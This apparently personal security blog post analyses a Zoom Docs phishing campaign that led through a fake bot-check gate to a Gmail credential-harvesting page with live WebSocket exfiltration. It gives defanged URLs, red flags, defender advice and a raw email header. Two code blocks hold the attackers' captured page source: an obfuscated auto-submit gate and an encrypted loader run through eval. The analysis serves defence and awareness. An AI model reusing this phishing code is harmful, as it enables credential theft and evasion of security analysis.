---
title: "look mom HR application look mom no job"
date: 2025-10-08T12:00:00+00:00
tags: ["phishing", "zoom", "email", "security", "blog"]
author: "Unknown"
draft: false
---

**TLDR**  
I have recieved a legit Zoom doc email from HR "while on job hunt" . It redirected to a site with a fake "bot protection" gate and then to a Gmail credential phish. The attackers exfiltrate creds live over WebSocket and even validate them in the backend. 
Keep reading for detailed analysis. 

# look mom HR application look mom no job

Okay, this is kind of funny (in a "please tell me this is not my life" way). I have been on the job hunt lately and an email landed in my inbox that I almost ignored. Only later did I realize: this one actually came from legit Zoom. Cool, right? Except not.

Turns out bad people are now using Zoom's legit features to phish people. Welcome to 2025, where your meeting app doubles as a cybercrime vector.

## what happened (short, messy, and real)

1. I got an email that looked like a normal Zoom doc/share notification. Header looked official. Sender looked legit. I almost clicked and moved on.  
   `![Email header](/images/Zoom_Phishing_Email_header.png)`  
   Caption: Email header with valid SPF, DKIM and DMARC.

2. On deeper inspection I realized the document link led to an offsite page that redirected to a classic Gmail credential harvesting page.  
   `![Zoom shared doc](/images/zoom_gmail_phishing.png)`  
   Caption: Zoom UI showing the shared document/link.

3. The attackers used Zoom's document-sharing flow as the trusted vector. People trust Zoom, so they click.
	   `![Zoom shared doc](/images/Hosted_on_zoom.png)`  
	   Caption: Screenshot of zoom website.
4. The phishing page had a "bot protection / phishing protection" gate that a user has to pass first. That is not to protect you - it is to protect the attackers from automated analysis and to make the page feel legitimate.  
   Paste screenshot here:  
   `![Bot protection gate](/images/Zoom_Phishing_bots.png)`  
   Caption: Fake bot protection gate that blocks sandboxes and looks legit.

5. One user entered their Gmail user ID and password. The phishing page immediately sent the credentials to a C2 using a WebSocket connection. Live exfiltration.  
   Paste screenshot here:  
   `![Gmail phishing page](/images/zoom_gmail_phishing.png)`  
   Caption: The Gmail credential harvest page.

6. I also captured a WebSocket snapshot showing the credentials being pushed out.  
   Paste screenshot here:  
   `![WebSocket exfiltration](/images/websocket_phishing.png)`  
   Caption: WebSocket connection showing live exfiltration.

## the chain of redirects I saw

- initial link from Zoom UI: `hxxps://overflow.qyrix[.]com.de/GAR@bBWe/`  
  - this hosts the bot protection gate

- once gate passed, redirected to:  
  `hxxps://overflow.qyrix[.]com.de/aoi99lxz7s0?id=02efd7fc7...`  
  - this is the Gmail phishing page

Yes, the URLs are ugly and tell you everything you need to know.

## how their setup works

1. Use a trusted platform (Zoom) to deliver the initial link. People click because it looks like a shared document.  
2. Redirect to a "bot protection" gate. Two jobs:  
   - keep automated analysis and sandboxes away, and  
   - increase perceived legitimacy for the victim.  
3. If the user passes the gate, show a credential harvest page that mimics Gmail login UI and asks for username and password.  
4. On submit, open a WebSocket back to the attacker server and push the credentials in real time to C2. The server can validate them and mark hits.  
5. They likely run a backend that validates credentials so they know which ones work. That is why the response felt slower than a static phishing page.

Given the validation and the slower response times I observed, they are probably validating credentials in the backend. That means they are not just collecting creds, they are checking them for usability.

## neat but malicious tricks they used

- bot-protection gate - not to protect you, to protect them from analysis and to look legit.  
- real-time exfil via WebSocket - gives attackers immediate hits and lets them triage validated creds quickly.  
- using Zoom's document flow as the social engineering vector - people trust Zoom notifications, so the click rate is higher.

## red flags to look for

- Email claims to come from Zoom, but the link domain does not match Zoom or Google. Always check the full link.  
- The page shows a "bot protection" widget or quiz before a login - that is suspicious in this context.  
```html
	<!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>&#8203;</title> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"> <style> body { min-height: 100vh; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); } .zb { background-color: white; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15); width: 100%; top: 32px; max-width: 420px; margin: auto; padding: 12px; text-align: center; position: relative; overflow: hidden; } h1 { color: #202124; margin-bottom: 15px; font-size: 22px; font-weight: 500; } p { color: #5f6368; margin-bottom: 30px; font-size: 16px; line-height: 1.5; } .qa { background-color: #1a73e8; color: white; border: none; border-radius: 24px; padding: 16px 32px; font-size: 16px; font-weight: 500; cursor: pointer; transition: all 0.3s ease; width: 100%; max-width: 280px; margin: 0 auto; position: relative; overflow: hidden; outline: none; } .qa:hover { background-color: #1565c0; box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3); } .qa.holding { background-color: #0d47a1; transform: scale(0.98); } .kh { position: absolute; bottom: 0; left: 0; height: 4px; background: linear-gradient(to right, #34A853, #FBBC05); width: 0%; transition: width 0.1s linear; border-radius: 0 0 24px 24px; } .hs { color: #34A853; font-weight: 500; margin-top: 25px; display: none; font-size: 18px; } .fm { font-size: 14px; color: #5f6368; margin-top: 12px; } @keyframes cz { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } } .cz { animation: cz 2s infinite; } </style> </head> <body> <form method="POST"> <input name="g-recaptcha-response" id="g-recaptcha-response" value="YowGxAgxpT" type="hidden"> </form> <div class="zb"> <h1>Press & Hold to confirm</h1> <p>You are a human (and not a bot)</p> <button class="qa cz" id="jx"> Press & Hold <div class="kh" id="sc"></div> </button> <p class="fm" id="me">Press and hold the button for 2 seconds to verify</p> <p class="hs" id="fy"> <i class="fas fa-check-circle"></i> Verification successful! </p> </div> <script> const jx = document.getElementById('jx'); const sc = document.getElementById('sc'); const fy = document.getElementById('fy'); const me = document.getElementById('me'); let wf; let gy = 0; let mo = 0; let yn = false; function gc() { return Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000; } function ki() { const at = Math.round(mo / 1000); me.textContent = `Press and hold the button for ${at} seconds to verify`; } function oz() { mo = gc(); ki(); } function ka() { if (yn) return; jx.classList.remove('cz'); jx.classList.add('holding'); gy = 0; wf = setInterval(function () { gy += 100; const bi = (gy / mo) * 100; sc.style.width = Math.min(bi, 100) + '%'; if (gy >= mo) { clearInterval(wf); yn = true; fy.style.display = 'block'; jx.textContent = 'Verification Complete'; jx.style.backgroundColor = '#34A853'; jx.disabled = true; jx.classList.remove('holding'); SabkWGjUry(); } }, 100); } function zc() { clearInterval(wf); jx.classList.remove('holding'); if (!yn && gy < mo) { sc.style.width = '0%'; jx.classList.add('cz'); mo = gc(); ki(); } } jx.addEventListener('mousedown', ka); jx.addEventListener('touchstart', ka); jx.addEventListener('mouseup', zc); jx.addEventListener('touchend', zc); jx.addEventListener('mouseleave', zc); jx.addEventListener('contextmenu', function (e) { e.preventDefault(); }); oz(); function SabkWGjUry() { let jo='f'+'or'+'ms'; let ih='sub'+'mit'; let mw='bo'+'dy'; let mh='cre'+'ate'+'Ele'+'ment'; for(let dx in this){ let op=this[dx]; if(op?.[jo]?.[0]?.[ih]&&op[mw]&&op[mh]){ op[jo][0][ih](); break; } } } </script> </body> </html>
```
- The login form is not hosted on the real provider domain.
```html
<!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <meta name="robots" content="noindex, nofollow"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>&#8203;</title> </head> <body> <script> const [bg, mc, va] = "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:538099:YjZkZmVkMjU=".split(":"); const ls = parseInt(mc); const my = 'a'+'t'+'o'+'b'; const yw = globalThis[my](va); const td = globalThis[my](bg); const gg = ls + yw.charCodeAt(0); let wd = gg; let mk = function () { wd = (wd * 9301 + 49297) % 233280; return wd / 233280; }; let bh = ""; for (let fm = 0; fm < td.length; fm++) { bh += String.fromCharCode(Math.floor(mk() * 256)); } const ue = bh; let xu = ls + 99; let le = function () { xu = (xu * 9301 + 49297) % 233280; return xu / 233280; }; let uj = []; for (let aq = 0; aq < td.length; aq++) { uj.push(Math.floor(le() * 25) + 1); } const yt = uj; let xk = ""; for (let tt = 0; tt < td.length; tt++) { let mr = td[tt]; let an = td.charCodeAt(tt); if (/[A-Za-z]/.test(mr)) { const tf = mr <= "Z" ? 65 : 97; an = ((an - tf - yt[tt] + 26) % 26) + tf; } an = an ^ ue.charCodeAt(tt); xk += String.fromCharCode(an); } const dz = xk; (function () { const ec = [0x6c, 0x61, 0x76, 0x65] .reverse() .map(rt => String.fromCharCode(rt)) .join(''); const bn = Function(String.fromCharCode(...[114,101,116,117,114,110,32,116,104,105,115]))(); const ix = { [Symbol.toPrimitive]: () => bn[ec](dz) }; const yq = {}; Object.defineProperty(yq, 'dk', { get() { ix + ''; } }); yq.dk; })(); </script> </body> </html>
```
- The login experience is slower or asks extra steps that normal logins do not.  
- Any login prompt that is not on the official provider domain is suspect.  
- Live WebSocket connections that open when you submit a form is a red flag.

## what you should do if you see this (As a user or as a SOC analyst)

1. Do not enter credentials. If you already did, change your password immediately and enable two-factor authentication. Use the real provider site to change the password.  
2. Check the email header and sender carefully. If your mail client allows full headers, inspect Received, DKIM, SPF and related fields.  
   Paste redacted header here if you want to show readers:  
```text
		Delivered-To: a<REMOVED@gmail.com
Received: by 2002:a2e:be0b:0:b0:375:d1f7:890f with SMTP id z11csp524328ljq;
        Tue, 7 Oct 2025 23:36:23 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IEzjGmfVNFiIgX/UNBRKYvp7nhhu4izWGwed1g8PzZ35o36jwgTVgdx6B7JLd+vpW3HPv/G
X-Received: by 2002:a05:622a:3cb:b0:4df:3886:44d5 with SMTP id d75a77b69052e-4e6ead6a788mr33704501cf.77.1759905383598;
        Tue, 07 Oct 2025 23:36:23 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1759905383; cv=none;
        d=google.com; s=arc-20240605;
        b=hQ5FD2jgTDzsMsdov1/EvHBfXE41VY2FghGv140kFvQObP6tmPzwvnLeK2Gf3e8jrN
         MhrpmPADSXfuOmB6t2MUfj7vNHaH2CGFhDGuYixbW86XfZ+XSBZpwOYC97yAtMf9hzeD
         I6tZbnwmqumPnnY/TY5YtVp+T6NwaKuztVnDblYyQMxDy3tWCWy97vq+KPA2QNzU5kwG
         puqpiHKlkEzrpRs01QwQH68orxpKD8yPe/CC5Mes84IDG5G1Ub/zVBjT1hgSjf6ETvZd
         sm3Z2qrRnngI5OMdXpPP3TQ3C6z2saz4il9JCK61pPc02Mv7Md7VdLreUg+TkFOSffnu
         h1yQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=to:subject:message-id:mime-version:from:date
         :content-transfer-encoding:dkim-signature:dkim-signature;
        bh=L9e/4qgSbudb7IAaAtlDmKzATLGd8q1nCkn3C4cp/HM=;
        fh=RFmQIHiLGrNHDAbpeX1mPjephCzOTUP+sRW4HrW5sUA=;
        b=GHshQwYq8JtTY9iTqyoBO+qMuL9H+6T3RWS4s8seseWZTZ8T3kmNYVizKe7Uf3FaN9
         /6ZS02ZwjYXv7Zz7alAtwzh0uwBcvDLSI+gD2aifFTcKcBjM3dxirsDCfXr8g6Xfe+zd
         NAxuSkDcvnJIHchAI8mvUrk9QHV7LrL6mN3hn+x0Wod21F3+U5AMNDk5QXaoHL94x9Kl
         RPHpNp9rGbxUlQeoZzg6MVnhJR2XTOC8NNIeX9rhhfUGNeN2CvO4oRiTf826n/Nr4Ruk
         QJTELo3U8JkbRo/sCdvUzwignRkSVwA2p7yZuiqVjltsSlWZ42ZpTCHoUSkDg1vfq5Zt
         dBaw==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@zoom.us header.s=sg header.b=QwQR+TUo;
       dkim=pass header.i=@sendgrid.info header.s=smtpapi header.b=Mq0IF8Se;
       spf=pass (google.com: domain of bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us designates 149.72.134.114 as permitted sender) smtp.mailfrom="bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us";
       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=zoom.us
Return-Path: <bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us>
Received: from o1.sg.zoom.us (o1.sg.zoom.us. [149.72.134.114])
        by mx.google.com with ESMTPS id af79cd13be357-877761dca22si742447485a.663.2025.10.07.23.36.23
        for <a<REMOVED@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Tue, 07 Oct 2025 23:36:23 -0700 (PDT)
Received-SPF: pass (google.com: domain of bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us designates 149.72.134.114 as permitted sender) client-ip=149.72.134.114;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@zoom.us header.s=sg header.b=QwQR+TUo;
       dkim=pass header.i=@sendgrid.info header.s=smtpapi header.b=Mq0IF8Se;
       spf=pass (google.com: domain of bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us designates 149.72.134.114 as permitted sender) smtp.mailfrom="bounces+15570388-f8c2-a<REMOVED=gmail.com@bounce-sg.zoom.us";
       dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=zoom.us
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=zoom.us; h=content-transfer-encoding:content-type:date:from:mime-version:subject: to:cc:content-type:date:feedback-id:from:subject:to; s=sg; bh=L9e/4qgSbudb7IAaAtlDmKzATLGd8q1nCkn3C4cp/HM=; b=QwQR+TUo9Eh0AGJ43cDyZdS961mnfsaqzKY7HqmafqGw9SKLSxMnt/y+G9Re0xqPYKMm HU1aGWB4hU5h0WBkbrM5pWqvlkWCBcT42sW56lx/KUk78VfBd2i0RZWTStFW/7AZ6tdA9Y 62/kU2VD4KcmOCgwfgTP2pNGYdzcsY/KVuBk6jj8r9W9gLfw7/aGeCCtNV9nb2YMxrWtlh zLmVH3cjBMwpKyG+lsUrKmj/KsW88gy7rnd8wugKfI4s6YMQdrokUWkaDG0yCoE3oCExq/ aSmTK+v7OjeXyzV5LakbCQ++C0X9sDW3P4yGZbfUrQ6cX+YJNr+1g+O4LRvaAD+Q==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.info; h=content-transfer-encoding:content-type:date:from:mime-version:subject: to:cc:content-type:date:feedback-id:from:subject:to; s=smtpapi; bh=L9e/4qgSbudb7IAaAtlDmKzATLGd8q1nCkn3C4cp/HM=; b=Mq0IF8SeCElhoDKS/ieCp4Z3YIDk0KhE7WUkKK1BQ2Gy0AGD+BWI0gRWPNLa/68aibEj CndU4o8768o1Zu1N6ZI3FJO1YJdAsoMCo/1BGnP03J7pW3/T9rgBpXDyb9yNkSyLjZGWzf +GUaIj5yeHEdY0zFXdxyi7cbpoVbhb4Sg=
Received: by recvd-7b5d7c7745-nftc8 with SMTP id recvd-7b5d7c7745-nftc8-1-68E60666-48 2025-10-08 06:36:22.87825075 +0000 UTC m=+10850580.628464530
Received: from MTU1NzAzODg (unknown) by geopod-ismtpd-9 (SG) with HTTP id iEl3B-XZTPCaqr7rYDq60A Wed, 08 Oct 2025 06:36:22.864 +0000 (UTC)
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Date: Wed, 08 Oct 2025 06:36:22 +0000 (UTC)
From: HR Departments via Zoom Docs <no-reply-docs@zoom.us>
Mime-Version: 1.0
Message-ID: <iEl3B-XZTPCaqr7rYDq60A@geopod-ismtpd-9>
Subject: HR Departments invited you to view "VIEW DOCUMENTS"
X-SG-EID: u001.h0/PrZVv+Q4W/jfBs3BdAlEeMy0yKqigmIqgtxzoUM558UTNuaeiiCz+wgq3NiXq2iPTpPsqJU77IbLYTG2rHs8D5GA5SLoWdmzWHcFdXVlWfm5rne4brVwfGeKXlu1xAkQFzCQqOEBnSUubMXT4Vy2NdENok0kSN2+tp4cE6/5FguxL+q7e2BGkxAftamzg34g4LmlWYq3WoKElUXzGkzMM6g5eXSmZb2VnmEPg6D3Rx5/vz6PsEAiYdXvZK0XyX9p8ggNnjCKHNK9/1a0mug==
X-SG-ID: u001.SdBcvi+Evd/bQef8eZF3BuAbfvMqHK5d64NovRFKoJdpXgDzDv+bhAbC6KDrhhKd6hcfoo51C9h4DoPq6z/pNc+soAhS7oG3shYodd+Ois+DaTSN+PexNhWgfCwPSBkl02ZLXYRf+BrvK3LxR9va3OzIGJlWpmcMsgOR0LISQxEqAsWiuIVvQ//snl33G/k37VOnTHIyBf1F4KQ2pvlQMGBKLkAZgmoRdlH7W1b7OW+LD9xyOvy1KjfpS6md/Nwlh5dm9A3ih1W53j/fQeMDIIvC2FUHzO6X2C4pHIaWhz9N6JDmXMrwkTa7iw5GSzm95EiAHA2CJPxUI8SjhzzweFim7TY1CpOwQdiD/h/uYtNF8BTxlpvdEAdjYRHhzmqzPGeszrOUQnHs6psM1mOGA00yPuXf4oUxBrxSuWosaTsV1cm5nhp8DXIR6x/bKnWAfHQm/Z/oK3rHGBcxdyfNpbjwaiUqZbf/ONe3kPGsO2xPiPd+jZhS5TCyH+DC5p/bj1AkGp+qROkPhbdoc7TF4K/AFLTxsWMp89WiG0jrQ9HAVFNl1C7r2Ov1JAorIZ/KMUtMafcdq/hb0TRYWyhwgkBQcSwOqZ4qfkxvRPqEs0jvmopTJd69vAsy6z4UXS2EoqMZKGehxVzq38EctDT9oKK9CBXCoccLTpdZPxKFxtxH8kEvufTZhWzxGUn//LIdvcVgFVnFfaX7siPs7ewfzq0XyNe+knZaBHehwA3HLlkcAcyOfRt9YAmVrj+kZZtZfRLXnLZl1Fllvs82eCywwcrHMZ/8zbrHbJ5zPA9wFczkr6FZoiNZcY1hDj4u2zi2Cdku9ot9EXtgjpK4QPygt921sKcE0Ez6ao8mYUoD7cn9KTgNSBCNUc3cqvDEaqJEmPs39gF9m4SrL4vVmbWnWkTTo1DFr1RMMW0F3H8tGF0=
To: a<REMOVED>@gmail.com
X-Entity-ID: u001.6mUY7xs+tNnsNuz7tuXEzQ==
```
3. Report to Zoom and Google. Use Zoom's abuse/reporting and Google's phishing report forms and attach screenshots and headers.

4. Block the domain at DNS or proxy level if you are an admin. For example, block overflow.qyrix.com.de.

5. Warn coworkers. These links are social engineering. People will click if it looks work-related.

6. Scan for suspicious outbound connections. WebSocket C2 exfil is a thing. Watch for unknown outbound ws/wss traffic from browsers.

7. Use a password manager. It will not autofill on off-domain pages and that provides another layer of defense.


## conclusion

I appreciate that Zoom wants to help me share stuff. I really do. And apparently attackers appreciate Zoom, too. They treat it like a trusted doorbell where people actually answer.

So next time you get a Zoom doc email titled "HR application" and feel your job prospects spike for a second, do not. Take two seconds to check the domain, the header and whether the login is actually on google.com. Your future self and your inbox will thank you.
